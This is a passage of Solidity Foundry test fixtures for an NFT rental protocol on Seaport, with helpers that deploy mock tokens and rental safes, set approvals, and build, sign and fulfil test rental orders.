        function _deployErc1155Token() internal returns (uint256 i) {
            // save the token's index
            i = erc1155s.length;

            // deploy the mock token
            MockERC1155 token = new MockERC1155();

            // push the token to the array of mocks
            erc1155s.push(token);

            // set the token label with the index
            vm.label(address(token), string.concat("MERC1155_", LibString.toString(i)));
        }

        function _deployRentalSafe(
            address owner,
            string memory name
        ) internal returns (address safe) {
            // Deploy a 1/1 rental safe
            address[] memory owners = new address[](1);
            owners[0] = owner;
            safe = factory.deployRentalSafe(owners, 1);



        }

        function _fundWalletAndDeployRentalSafe(
            string memory name
        ) internal returns (ProtocolAccount memory account) {
            // create a wallet with a address, public key, and private key
            Vm.Wallet memory wallet = vm.createWallet(name);

            // deploy a rental safe for the address
            address rentalSafe = _deployRentalSafe(wallet.addr, name);

            // fund the wallet with ether, all erc20s, and approve the conduit for erc20s, erc721s, erc1155s
            _allocateTokensAndApprovals(wallet.addr, 10000);

            // create an account
            account = ProtocolAccount({
                addr: wallet.addr,
                safe: SafeL2(payable(rentalSafe)),
                publicKeyX: wallet.publicKeyX,
                publicKeyY: wallet.publicKeyY,
                privateKey: wallet.privateKey
            });

        }

        function _allocateTokensAndApprovals(address to, uint128 amount) internal {
            // deal ether to the recipient
            vm.deal(to, amount);

            // mint all erc20 tokens to the recipient
            for (uint256 i = 0; i < erc20s.length; ++i) {
                erc20s[i].mint(to, amount);
            }

            // set token approvals
            _setApprovals(to);
        }

        function _setApprovals(address owner) internal {
            // impersonate the owner address
            vm.startPrank(owner);

            // set all approvals for erc20 tokens
            for (uint256 i = 0; i < erc20s.length; ++i) {
                erc20s[i].approve(address(conduit), type(uint256).max);
            }

            // set all approvals for erc721 tokens
            for (uint256 i = 0; i < erc721s.length; ++i) {
                erc721s[i].setApprovalForAll(address(conduit), true);
            }

            // set all approvals for erc1155 tokens
            for (uint256 i = 0; i < erc1155s.length; ++i) {
                erc1155s[i].setApprovalForAll(address(conduit), true);
            }

            // stop impersonating
            vm.stopPrank();
        }
    }



    interface ERC1155TokenReceiver {

        function onERC1155Received(
            address _operator,
            address _from,
            uint256 _id,
            uint256 _value,
            bytes calldata _data
        ) external returns (bytes4);

        function onERC1155BatchReceived(
            address _operator,
            address _from,
            uint256[] calldata _ids,
            uint256[] calldata _values,
            bytes calldata _data
        ) external returns (bytes4);
    }

    interface ERC721TokenReceiver {
        function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes calldata _data) external returns (bytes4);
    }

    interface IERC165 {
        function supportsInterface(bytes4 interfaceId) external view returns (bool);
    }


    /**
    * Borrowed from gnosis safe smart contracts
    * @title Default Callback Handler - Handles supported tokens' callbacks, allowing Safes receiving these tokens.
    * @author Richard Meissner - @rmeissner
    */
    contract TokenCallbackHandler is ERC1155TokenReceiver, ERC721TokenReceiver, IERC165 {
        /**
        * @notice Handles ERC1155 Token callback.
        * return Standardized onERC1155Received return value.
        */
        function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure override returns (bytes4) {
            return 0xf23a6e61;
        }

        /**
        * @notice Handles ERC1155 Token batch callback.
        * return Standardized onERC1155BatchReceived return value.
        */
        function onERC1155BatchReceived(
            address,
            address,
            uint256[] calldata,
            uint256[] calldata,
            bytes calldata
        ) external pure override returns (bytes4) {
            return 0xbc197c81;
        }

        /**
        * @notice Handles ERC721 Token callback.
        *  return Standardized onERC721Received return value.
        */
        function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
            return 0x150b7a02;
        }

        /**
        * @notice Handles ERC777 Token callback.
        * return nothing (not standardized)
        */
        function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata) external pure {
            // We implement this for completeness, doesn't really have any value
        }

        /**
        * @notice Implements ERC165 interface support for ERC1155TokenReceiver, ERC721TokenReceiver and IERC165.
        * @param interfaceId Id of the interface.
        * @return if the interface is supported.
        */
        function supportsInterface(bytes4 interfaceId) external view virtual override returns (bool) {
            return
                interfaceId == type(ERC1155TokenReceiver).interfaceId ||
                interfaceId == type(ERC721TokenReceiver).interfaceId ||
                interfaceId == type(IERC165).interfaceId;
        }

    }



    // Sets up logic in the test engine related to order creation
    // Borrowed from test/fixtures/engine/OrderCreator
    contract OrderCreator is AccountCreator {
        using OfferItemLib for OfferItem;
        using ConsiderationItemLib for ConsiderationItem;
        using OrderComponentsLib for OrderComponents;
        using OrderLib for Order;
        using ECDSA for bytes32;

        // defines a config for a standard order component
        string constant STANDARD_ORDER_COMPONENTS = "standard_order_components";

        struct OrderToCreate {
            ProtocolAccount offerer;
            OfferItem[] offerItems;
            ConsiderationItem[] considerationItems;
            OrderMetadata metadata;
        }

        // keeps track of tokens used during a test
        uint256[] usedOfferERC721s;
        uint256[] usedOfferERC1155s;

        uint256[] usedConsiderationERC721s;
        uint256[] usedConsiderationERC1155s;

        // components of an order
        OrderToCreate orderToCreate;

        function setUp() public virtual override {
            super.setUp();

            // Define a standard OrderComponents struct which is ready for
            // use with the Create Policy and the protocol conduit contract
            OrderComponentsLib
                .empty()
                .withOrderType(SeaportOrderType.FULL_RESTRICTED)
                .withZone(address(create))
                .withStartTime(block.timestamp)
                .withEndTime(block.timestamp + 100)
                .withSalt(123456789)
                .withConduitKey(conduitKey)
                .saveDefault(STANDARD_ORDER_COMPONENTS);

            // for each test token, create a storage slot
            for (uint256 i = 0; i < erc721s.length; i++) {
                usedOfferERC721s.push();
                usedConsiderationERC721s.push();

                usedOfferERC1155s.push();
                usedConsiderationERC1155s.push();
            }
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                                Order Creation                               //
        /////////////////////////////////////////////////////////////////////////////////

        // creates an order based on the provided context. The defaults on this order
        // are good for most test cases.
        function createOrder(
            ProtocolAccount memory offerer,
            OrderType orderType,
            uint256 erc721Offers,
            uint256 erc1155Offers,
            uint256 erc20Offers,
            uint256 erc721Considerations,
            uint256 erc1155Considerations,
            uint256 erc20Considerations
        ) internal {
            // require that the number of offer items or consideration items
            // dont exceed the number of test tokens
            require(
                erc721Offers <= erc721s.length &&
                    erc721Offers <= erc1155s.length &&
                    erc20Offers <= erc20s.length,
                "TEST: too many offer items defined"
            );
            require(
                erc721Considerations <= erc721s.length &&
                    erc1155Considerations <= erc1155s.length &&
                    erc20Considerations <= erc20s.length,
                "TEST: too many consideration items defined"
            );

            // create the offerer
            _createOfferer(offerer);

            // add the offer items
            _createOfferItems(erc721Offers, erc1155Offers, erc20Offers);

            // create the consideration items
            _createConsiderationItems(
                erc721Considerations,
                erc1155Considerations,
                erc20Considerations
            );

            // Create order metadata
            _createOrderMetadata(orderType);
        }

        // Creates an offerer on the order to create
        function _createOfferer(ProtocolAccount memory offerer) private {
            orderToCreate.offerer = offerer;
        }

        // Creates offer items which are good for most tests
        function _createOfferItems(
            uint256 erc721Offers,
            uint256 erc1155Offers,
            uint256 erc20Offers
        ) private {
            // generate the ERC721 offer items
            for (uint256 i = 0; i < erc721Offers; ++i) {
                // create the offer item
                orderToCreate.offerItems.push(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC721)
                        .withToken(address(erc721s[i]))
                        .withIdentifierOrCriteria(usedOfferERC721s[i])
                        .withStartAmount(1)
                        .withEndAmount(1)
                );

                // mint an erc721 to the offerer
                erc721s[i].mint(orderToCreate.offerer.addr);

                // update the used token so it cannot be used again in the same test
                usedOfferERC721s[i]++;
            }

            // generate the ERC1155 offer items
            for (uint256 i = 0; i < erc1155Offers; ++i) {
                // create the offer item
                orderToCreate.offerItems.push(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC1155)
                        .withToken(address(erc1155s[i]))
                        .withIdentifierOrCriteria(usedOfferERC1155s[i])
                        .withStartAmount(100)
                        .withEndAmount(100)
                );

                // mint an erc1155 to the offerer
                erc1155s[i].mint(orderToCreate.offerer.addr, 100);

                // update the used token so it cannot be used again in the same test
                usedOfferERC1155s[i]++;
            }

            // generate the ERC20 offer items
            for (uint256 i = 0; i < erc20Offers; ++i) {
                // create the offer item
                orderToCreate.offerItems.push(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC20)
                        .withToken(address(erc20s[i]))
                        .withStartAmount(100)
                        .withEndAmount(100)
                );
            }
        }

        // Creates consideration items that are good for most tests
        function _createConsiderationItems(
            uint256 erc721Considerations,
            uint256 erc1155Considerations,
            uint256 erc20Considerations
        ) private {
            // generate the ERC721 consideration items
            for (uint256 i = 0; i < erc721Considerations; ++i) {
                // create the consideration item, and set the recipient as the offerer's
                // rental safe address
                orderToCreate.considerationItems.push(
                    ConsiderationItemLib
                        .empty()
                        .withRecipient(address(orderToCreate.offerer.safe))
                        .withItemType(ItemType.ERC721)
                        .withToken(address(erc721s[i]))
                        .withIdentifierOrCriteria(usedConsiderationERC721s[i])
                        .withStartAmount(1)
                        .withEndAmount(1)
                );

                // update the used token so it cannot be used again in the same test
                usedConsiderationERC721s[i]++;
            }

            // generate the ERC1155 consideration items
            for (uint256 i = 0; i < erc1155Considerations; ++i) {
                // create the consideration item, and set the recipient as the offerer's
                // rental safe address
                orderToCreate.considerationItems.push(
                    ConsiderationItemLib
                        .empty()
                        .withRecipient(address(orderToCreate.offerer.safe))
                        .withItemType(ItemType.ERC1155)
                        .withToken(address(erc1155s[i]))
                        .withIdentifierOrCriteria(usedConsiderationERC1155s[i])
                        .withStartAmount(100)
                        .withEndAmount(100)
                );

                // update the used token so it cannot be used again in the same test
                usedConsiderationERC1155s[i]++;
            }

            // generate the ERC20 consideration items
            for (uint256 i = 0; i < erc20Considerations; ++i) {
                // create the offer item
                orderToCreate.considerationItems.push(
                    ConsiderationItemLib
                        .empty()
                        .withRecipient(address(ESCRW))
                        .withItemType(ItemType.ERC20)
                        .withToken(address(erc20s[i]))
                        .withStartAmount(100)
                        .withEndAmount(100)
                );
            }
        }

        // Creates a order metadata that is good for most tests
        function _createOrderMetadata(OrderType orderType) private {
            // Create order metadata
            orderToCreate.metadata.orderType = orderType;
            orderToCreate.metadata.rentDuration = 500;
            orderToCreate.metadata.emittedExtraData = new bytes(0);
        }

        // creates a signed seaport order ready to be fulfilled by a renter
        function _createSignedOrder(
            ProtocolAccount memory _offerer,
            OfferItem[] memory _offerItems,
            ConsiderationItem[] memory _considerationItems,
            OrderMetadata memory _metadata
        ) private view returns (Order memory order, bytes32 orderHash) {
            // Build the order components
            OrderComponents memory orderComponents = OrderComponentsLib
                .fromDefault(STANDARD_ORDER_COMPONENTS)
                .withOfferer(_offerer.addr)
                .withOffer(_offerItems)
                .withConsideration(_considerationItems)
                .withZoneHash(create.getOrderMetadataHash(_metadata))
                .withCounter(seaport.getCounter(_offerer.addr));

            // generate the order hash
            orderHash = seaport.getOrderHash(orderComponents);

            // generate the signature for the order components
            bytes memory signature = _signSeaportOrder(_offerer.privateKey, orderHash);

            // create the order, but dont provide a signature if its a PAYEE order.
            // Since PAYEE orders are fulfilled by the offerer of the order, they
            // dont need a signature.
            if (_metadata.orderType == OrderType.PAYEE) {
                order = OrderLib.empty().withParameters(orderComponents.toOrderParameters());
            } else {
                order = OrderLib
                    .empty()
                    .withParameters(orderComponents.toOrderParameters())
                    .withSignature(signature);
            }
        }

        function _signSeaportOrder(
            uint256 signerPrivateKey,
            bytes32 orderHash
        ) private view returns (bytes memory signature) {
            // fetch domain separator from seaport
            (, bytes32 domainSeparator, ) = seaport.information();

            // sign the EIP-712 digest
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(
                signerPrivateKey,
                domainSeparator.toTypedDataHash(orderHash)
            );

            // encode the signature
            signature = abi.encodePacked(r, s, v);
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                               Order Amendments                              //
        /////////////////////////////////////////////////////////////////////////////////

        function resetOrderToCreate() internal {
            delete orderToCreate;
        }

        function withOfferer(ProtocolAccount memory _offerer) internal {
            orderToCreate.offerer = _offerer;
        }

        function resetOfferer() internal {
            delete orderToCreate.offerer;
        }

        function withReplacedOfferItems(OfferItem[] memory _offerItems) internal {
            // reset all current offer items
            resetOfferItems();

            // add the new offer items to storage
            for (uint256 i = 0; i < _offerItems.length; i++) {
                orderToCreate.offerItems.push(_offerItems[i]);
            }
        }

        function withOfferItem(OfferItem memory offerItem) internal {
            orderToCreate.offerItems.push(offerItem);
        }

        function resetOfferItems() internal {
            delete orderToCreate.offerItems;
        }

        function popOfferItem() internal {
            orderToCreate.offerItems.pop();
        }

        function withReplacedConsiderationItems(
            ConsiderationItem[] memory _considerationItems
        ) internal {
            // reset all current consideration items
            resetConsiderationItems();

            // add the new consideration items to storage
            for (uint256 i = 0; i < _considerationItems.length; i++) {
                orderToCreate.considerationItems.push(_considerationItems[i]);
            }
        }

        function withConsiderationItem(ConsiderationItem memory considerationItem) internal {
            orderToCreate.considerationItems.push(considerationItem);
        }

        function resetConsiderationItems() internal {
            delete orderToCreate.considerationItems;
        }

        function popConsiderationItem() internal {
            orderToCreate.considerationItems.pop();
        }

        function withHooks(Hook[] memory hooks) internal {
            // delete the current metatdata hooks
            delete orderToCreate.metadata.hooks;

            // add each metadata hook to storage
            for (uint256 i = 0; i < hooks.length; i++) {
                orderToCreate.metadata.hooks.push(hooks[i]);
            }
        }

        function withOrderMetadata(OrderMetadata memory _metadata) internal {
            // update the static metadata parameters
            orderToCreate.metadata.orderType = _metadata.orderType;
            orderToCreate.metadata.rentDuration = _metadata.rentDuration;
            orderToCreate.metadata.emittedExtraData = _metadata.emittedExtraData;

            // update the hooks
            withHooks(_metadata.hooks);
        }

        function resetOrderMetadata() internal {
            delete orderToCreate.metadata;
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                              Order Finalization                             //
        /////////////////////////////////////////////////////////////////////////////////

        function finalizeOrder()
            internal
            returns (Order memory, bytes32, OrderMetadata memory)
        {
            // create and sign the order
            (Order memory order, bytes32 orderHash) = _createSignedOrder(
                orderToCreate.offerer,
                orderToCreate.offerItems,
                orderToCreate.considerationItems,
                orderToCreate.metadata
            );

            // pull order metadata into memory
            OrderMetadata memory metadata = orderToCreate.metadata;

            // clear structs
            resetOrderToCreate();

            return (order, orderHash, metadata);
        }
    }


    // Sets up logic in the test engine related to order fulfillment
    // Borrowed from test/fixtures/engine/OrderFulfiller
    contract OrderFulfiller is OrderCreator {
        using ECDSA for bytes32;

        struct OrderToFulfill {
            bytes32 orderHash;
            RentPayload payload;
            AdvancedOrder advancedOrder;
        }

        // components of a fulfillment
        ProtocolAccount fulfiller;
        OrderToFulfill[] ordersToFulfill;
        Fulfillment[] seaportMatchOrderFulfillments;
        FulfillmentComponent[][] seaportOfferFulfillments;
        FulfillmentComponent[][] seaportConsiderationFulfillments;
        address seaportRecipient;

        /////////////////////////////////////////////////////////////////////////////////
        //                             Fulfillment Creation                            //
        /////////////////////////////////////////////////////////////////////////////////

        // creates an order fulfillment
        function createOrderFulfillment(
            ProtocolAccount memory _fulfiller,
            Order memory order,
            bytes32 orderHash,
            OrderMetadata memory metadata
        ) internal {
            // set the fulfiller account
            fulfiller = _fulfiller;

            // set the recipient of any offer items after an order is fulfilled. If the fulfillment is via
            // `matchAdvancedOrders`, then any unspent offer items will go to this address as well
            seaportRecipient = address(_fulfiller.safe);

            // get a pointer to a new order to fulfill
            OrderToFulfill storage orderToFulfill = ordersToFulfill.push();

            // create an order fulfillment
            OrderFulfillment memory fulfillment = OrderFulfillment(address(_fulfiller.safe));

            // add the order hash and fulfiller
            orderToFulfill.orderHash = orderHash;

            // create rental zone payload data
            _createRentalPayload(
                orderToFulfill.payload,
                RentPayload(fulfillment, metadata, block.timestamp + 100, _fulfiller.addr)
            );

            // generate the signature for the payload
            bytes memory signature = _signProtocolOrder(
                rentalSigner.privateKey,
                create.getRentPayloadHash(orderToFulfill.payload)
            );

            // create an advanced order from the order. Pass the rental
            // payload as extra data
            _createAdvancedOrder(
                orderToFulfill.advancedOrder,
                AdvancedOrder(
                    order.parameters,
                    1,
                    1,
                    order.signature,
                    abi.encode(orderToFulfill.payload, signature)
                )
            );
        }

        function _createOrderFulfiller(
            ProtocolAccount storage storageFulfiller,
            ProtocolAccount memory _fulfiller
        ) private {
            storageFulfiller.addr = _fulfiller.addr;
            storageFulfiller.safe = _fulfiller.safe;
            storageFulfiller.publicKeyX = _fulfiller.publicKeyX;
            storageFulfiller.publicKeyY = _fulfiller.publicKeyY;
            storageFulfiller.privateKey = _fulfiller.privateKey;
        }

        function _createOrderFulfillment(
            OrderFulfillment storage storageFulfillment,
            OrderFulfillment memory fulfillment
        ) private {
            storageFulfillment.recipient = fulfillment.recipient;
        }

        function _createOrderMetadata(
            OrderMetadata storage storageMetadata,
            OrderMetadata memory metadata
        ) private {
            // Create order metadata in storage
            storageMetadata.orderType = metadata.orderType;
            storageMetadata.rentDuration = metadata.rentDuration;
            storageMetadata.emittedExtraData = metadata.emittedExtraData;

            // dynamically push the hooks from memory to storage
            for (uint256 i = 0; i < metadata.hooks.length; i++) {
                storageMetadata.hooks.push(metadata.hooks[i]);
            }
        }

        function _createRentalPayload(
            RentPayload storage storagePayload,
            RentPayload memory payload
        ) private {
            // set payload fulfillment on the order to fulfill
            _createOrderFulfillment(storagePayload.fulfillment, payload.fulfillment);

            // set payload metadata on the order to fulfill
            _createOrderMetadata(storagePayload.metadata, payload.metadata);

            // set payload expiration on the order to fulfill
            storagePayload.expiration = payload.expiration;

            // set payload intended fulfiller on the order to fulfill
            storagePayload.intendedFulfiller = payload.intendedFulfiller;
        }

        function _createAdvancedOrder(
            AdvancedOrder storage storageAdvancedOrder,
            AdvancedOrder memory advancedOrder
        ) private {
            // create the order parameters on the order to fulfill
            _createOrderParameters(storageAdvancedOrder.parameters, advancedOrder.parameters);

            // create the rest of the static parameters on the order to fulfill
            storageAdvancedOrder.numerator = advancedOrder.numerator;
            storageAdvancedOrder.denominator = advancedOrder.denominator;
            storageAdvancedOrder.signature = advancedOrder.signature;
            storageAdvancedOrder.extraData = advancedOrder.extraData;
        }

        function _createOrderParameters(
            OrderParameters storage storageOrderParameters,
            OrderParameters memory orderParameters
        ) private {
            // create the static order parameters for the order to fulfill
            storageOrderParameters.offerer = orderParameters.offerer;
            storageOrderParameters.zone = orderParameters.zone;
            storageOrderParameters.orderType = orderParameters.orderType;
            storageOrderParameters.startTime = orderParameters.startTime;
            storageOrderParameters.endTime = orderParameters.endTime;
            storageOrderParameters.zoneHash = orderParameters.zoneHash;
            storageOrderParameters.salt = orderParameters.salt;
            storageOrderParameters.conduitKey = orderParameters.conduitKey;
            storageOrderParameters.totalOriginalConsiderationItems = orderParameters
                .totalOriginalConsiderationItems;

            // create the dynamic order parameters for the order to fulfill
            for (uint256 i = 0; i < orderParameters.offer.length; i++) {
                storageOrderParameters.offer.push(orderParameters.offer[i]);
            }
            for (uint256 i = 0; i < orderParameters.consideration.length; i++) {
                storageOrderParameters.consideration.push(orderParameters.consideration[i]);
            }
        }

        function _createSeaportFulfillment(
            Fulfillment storage storageFulfillment,
            Fulfillment memory fulfillment
        ) private {
            // push the offer components to storage
            for (uint256 i = 0; i < fulfillment.offerComponents.length; i++) {
                storageFulfillment.offerComponents.push(fulfillment.offerComponents[i]);
            }

            // push the consideration components to storage
            for (uint256 i = 0; i < fulfillment.considerationComponents.length; i++) {
                storageFulfillment.considerationComponents.push(
                    fulfillment.considerationComponents[i]
                );
            }
        }

        function _seaportItemTypeToRentalItemType(
            SeaportItemType seaportItemType
        ) internal pure returns (RentalItemType) {
            if (seaportItemType == SeaportItemType.ERC20) {
                return RentalItemType.ERC20;
            } else if (seaportItemType == SeaportItemType.ERC721) {
                return RentalItemType.ERC721;
            } else if (seaportItemType == SeaportItemType.ERC1155) {
                return RentalItemType.ERC1155;
            } else {
                revert("seaport item type not supported");
            }
        }

        function _createRentalOrder(
            OrderToFulfill memory orderToFulfill
        ) internal view returns (RentalOrder memory rentalOrder) {
            // get the order parameters
            OrderParameters memory parameters = orderToFulfill.advancedOrder.parameters;

            // get the payload
            RentPayload memory payload = orderToFulfill.payload;

            // get the metadata
            OrderMetadata memory metadata = payload.metadata;

            // construct a rental order
            rentalOrder = RentalOrder({
                seaportOrderHash: orderToFulfill.orderHash,
                items: new Item[](parameters.offer.length + parameters.consideration.length),
                hooks: metadata.hooks,
                orderType: metadata.orderType,
                lender: parameters.offerer,
                renter: payload.intendedFulfiller,
                rentalWallet: payload.fulfillment.recipient,
                startTimestamp: block.timestamp,
                endTimestamp: block.timestamp + metadata.rentDuration
            });

            // for each new offer item being rented, create a new item struct to add to the rental order
            for (uint256 i = 0; i < parameters.offer.length; i++) {
                // PAYEE orders cannot have offer items
                require(
                    metadata.orderType != OrderType.PAYEE,
                    "TEST: cannot have offer items in PAYEE order"
                );

                // get the offer item
                OfferItem memory offerItem = parameters.offer[i];

                // determine the item type
                RentalItemType itemType = _seaportItemTypeToRentalItemType(offerItem.itemType);

                // determine which entity the payment will settle to
                SettleTo settleTo = offerItem.itemType == SeaportItemType.ERC20
                    ? SettleTo.RENTER
                    : SettleTo.LENDER;

                // create a new rental item
                rentalOrder.items[i] = Item({
                    itemType: itemType,
                    settleTo: settleTo,
                    token: offerItem.token,
                    amount: offerItem.startAmount,
                    identifier: offerItem.identifierOrCriteria
                });
            }

            // for each consideration item in return, create a new item struct to add to the rental order
            for (uint256 i = 0; i < parameters.consideration.length; i++) {
                // PAY orders cannot have consideration items
                require(
                    metadata.orderType != OrderType.PAY,
                    "TEST: cannot have consideration items in PAY order"
                );

                // get the offer item
                ConsiderationItem memory considerationItem = parameters.consideration[i];

                // determine the item type
                RentalItemType itemType = _seaportItemTypeToRentalItemType(
                    considerationItem.itemType
                );

                // determine which entity the payment will settle to
                SettleTo settleTo = metadata.orderType == OrderType.PAYEE &&
                    considerationItem.itemType == SeaportItemType.ERC20
                    ? SettleTo.RENTER
                    : SettleTo.LENDER;

                // calculate item index offset
                uint256 itemIndex = i + parameters.offer.length;

                // create a new payment item
                rentalOrder.items[itemIndex] = Item({
                    itemType: itemType,
                    settleTo: settleTo,
                    token: considerationItem.token,
                    amount: considerationItem.startAmount,
                    identifier: considerationItem.identifierOrCriteria
                });
            }
        }

        function _signProtocolOrder(
            uint256 signerPrivateKey,
            bytes32 payloadHash
        ) internal view returns (bytes memory signature) {
            // fetch domain separator from create policy
            bytes32 domainSeparator = create.domainSeparator();

            // sign the EIP-712 digest
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(
                signerPrivateKey,
                domainSeparator.toTypedDataHash(payloadHash)
            );

            // encode the signature
            signature = abi.encodePacked(r, s, v);
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                            Fulfillment Amendments                           //
        /////////////////////////////////////////////////////////////////////////////////

        function withFulfiller(ProtocolAccount memory _fulfiller) internal {
            fulfiller = _fulfiller;
        }

        function withRecipient(address _recipient) internal {
            seaportRecipient = _recipient;
        }

        function withAdvancedOrder(
            AdvancedOrder memory _advancedOrder,
            uint256 orderIndex
        ) internal {
            // get a storage pointer to the order to fulfill
            OrderToFulfill storage orderToFulfill = ordersToFulfill[orderIndex];

            // set the new advanced order
            _createAdvancedOrder(orderToFulfill.advancedOrder, _advancedOrder);
        }

        function withSeaportMatchOrderFulfillment(Fulfillment memory _fulfillment) internal {
            // get a pointer to a new seaport fulfillment
            Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();

            // set the fulfillment
            _createSeaportFulfillment(
                fulfillment,
                Fulfillment({
                    offerComponents: _fulfillment.offerComponents,
                    considerationComponents: _fulfillment.considerationComponents
                })
            );
        }

        function withSeaportMatchOrderFulfillments(
            Fulfillment[] memory fulfillments
        ) internal {
            // reset all current seaport match order fulfillments
            resetSeaportMatchOrderFulfillments();

            // add the new offer items to storage
            for (uint256 i = 0; i < fulfillments.length; i++) {
                // get a pointer to a new seaport fulfillment
                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();

                // set the fulfillment
                _createSeaportFulfillment(
                    fulfillment,
                    Fulfillment({
                        offerComponents: fulfillments[i].offerComponents,
                        considerationComponents: fulfillments[i].considerationComponents
                    })
                );
            }
        }

        function withBaseOrderFulfillmentComponents() internal {
            // create offer fulfillments. We need to specify which offer items can be aggregated
            // into one transaction. For example, 2 different orders where the same seller is offering
            // the same item in each.
            //
            // Since BASE orders will only contain ERC721 offer items, these cannot be aggregated. So, a separate fulfillment
            // is created for each order.
            for (uint256 i = 0; i < ordersToFulfill.length; i++) {
                // get a pointer to a new offer fulfillment array. This array will contain indexes of
                // orders and items which are all grouped on whether they can be combined in a single transferFrom()
                FulfillmentComponent[] storage offerFulfillments = seaportOfferFulfillments
                    .push();

                // number of offer items in the order
                uint256 offerItemsInOrder = ordersToFulfill[i]
                    .advancedOrder
                    .parameters
                    .offer
                    .length;

                // add a single fulfillment component for each offer item in the order
                for (uint256 j = 0; j < offerItemsInOrder; j++) {
                    offerFulfillments.push(
                        FulfillmentComponent({orderIndex: i, itemIndex: j})
                    );
                }
            }

            // create consideration fulfillments. We need to specify which consideration items can be aggregated
            // into one transaction. For example, 3 different orders where the same fungible consideration items are
            // expected in return.
            //
            // get a pointer to a new offer fulfillment array. This array will contain indexes of
            // orders and items which are all grouped on whether they can be combined in a single transferFrom()
            FulfillmentComponent[]
                storage considerationFulfillments = seaportConsiderationFulfillments.push();

            // BASE orders will only contain ERC20 items, these are fungible and are candidates for aggregation. Because
            // all of these BASE orders will be fulfilled by the same EOA, and all ERC20 consideration items are going to the
            // ESCRW contract, the consideration items can be aggregated. In other words, Seaport will only make a single transfer
            // of ERC20 tokens from the fulfiller EOA to the payment escrow contract.
            //
            // put all fulfillments into one which can be an aggregated transfer
            for (uint256 i = 0; i < ordersToFulfill.length; i++) {
                considerationFulfillments.push(
                    FulfillmentComponent({orderIndex: i, itemIndex: 0})
                );
            }
        }

        function withLinkedPayAndPayeeOrders(
            uint256 payOrderIndex,
            uint256 payeeOrderIndex
        ) internal {
            // get the PAYEE order
            OrderParameters memory payeeOrder = ordersToFulfill[payeeOrderIndex]
                .advancedOrder
                .parameters;

            // For each consideration item in the PAYEE order, a fulfillment should be
            // constructed with a corresponding item from the PAY order's offer items.
            for (uint256 i = 0; i < payeeOrder.consideration.length; ++i) {
                // define the offer components
                FulfillmentComponent[] memory offerComponents = new FulfillmentComponent[](1);
                offerComponents[0] = FulfillmentComponent({
                    orderIndex: payOrderIndex,
                    itemIndex: i
                });

                // define the consideration components
                FulfillmentComponent[]
                    memory considerationComponents = new FulfillmentComponent[](1);
                considerationComponents[0] = FulfillmentComponent({
                    orderIndex: payeeOrderIndex,
                    itemIndex: i
                });

                // get a pointer to a new seaport fulfillment
                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();

                // set the fulfillment
                _createSeaportFulfillment(
                    fulfillment,
                    Fulfillment({
                        offerComponents: offerComponents,
                        considerationComponents: considerationComponents
                    })
                );
            }
        }

        function resetFulfiller() internal {
            delete fulfiller;
        }

        function resetOrdersToFulfill() internal {
            delete ordersToFulfill;
        }

        function resetSeaportMatchOrderFulfillments() internal {
            delete seaportMatchOrderFulfillments;
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                           Fulfillment Finalization                          //
        /////////////////////////////////////////////////////////////////////////////////

        function _finalizePayOrderFulfillment(
            bytes memory expectedError
        )
            private
            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)
        {
            // get the orders to fulfill
            OrderToFulfill memory payOrder = ordersToFulfill[0];
            OrderToFulfill memory payeeOrder = ordersToFulfill[1];

            // create rental orders
            payRentalOrder = _createRentalOrder(payOrder);
            payeeRentalOrder = _createRentalOrder(payeeOrder);

            // expect an error if error data was provided
            if (expectedError.length != 0) {
                vm.expectRevert(expectedError);
            }
            // otherwise, expect the relevant event to be emitted.
            else {
                vm.expectEmit({emitter: address(create)});
                emit Events.RentalOrderStarted(
                    create.getRentalOrderHash(payRentalOrder),
                    payOrder.payload.metadata.emittedExtraData,
                    payRentalOrder.seaportOrderHash,
                    payRentalOrder.items,
                    payRentalOrder.hooks,
                    payRentalOrder.orderType,
                    payRentalOrder.lender,
                    payRentalOrder.renter,
                    payRentalOrder.rentalWallet,
                    payRentalOrder.startTimestamp,
                    payRentalOrder.endTimestamp
                );
            }

            // the offerer of the PAYEE order fulfills the orders.
            vm.prank(fulfiller.addr);

            // fulfill the orders
            seaport.matchAdvancedOrders(
                _deconstructOrdersToFulfill(),
                new CriteriaResolver[](0),
                seaportMatchOrderFulfillments,
                seaportRecipient
            );

            // clear structs
            resetFulfiller();
            resetOrdersToFulfill();
            resetSeaportMatchOrderFulfillments();
        }

        function finalizePayOrderFulfillment()
            internal
            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)
        {
            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(bytes(""));
        }

        function finalizePayOrderFulfillmentWithError(
            bytes memory expectedError
        )
            internal
            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)
        {
            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(expectedError);
        }

        function _finalizeBaseOrderFulfillment(
            bytes memory expectedError
        ) private returns (RentalOrder memory rentalOrder) {
            // get the order to fulfill
            OrderToFulfill memory baseOrder = ordersToFulfill[0];

            // create a rental order
            rentalOrder = _createRentalOrder(baseOrder);

            // expect an error if error data was provided
            if (expectedError.length != 0) {
                vm.expectRevert(expectedError);
            }
            // otherwise, expect the relevant event to be emitted.
            else {
                vm.expectEmit({emitter: address(create)});
                emit Events.RentalOrderStarted(
                    create.getRentalOrderHash(rentalOrder),
                    baseOrder.payload.metadata.emittedExtraData,
                    rentalOrder.seaportOrderHash,
                    rentalOrder.items,
                    rentalOrder.hooks,
                    rentalOrder.orderType,
                    rentalOrder.lender,
                    rentalOrder.renter,
                    rentalOrder.rentalWallet,
                    rentalOrder.startTimestamp,
                    rentalOrder.endTimestamp
                );
            }

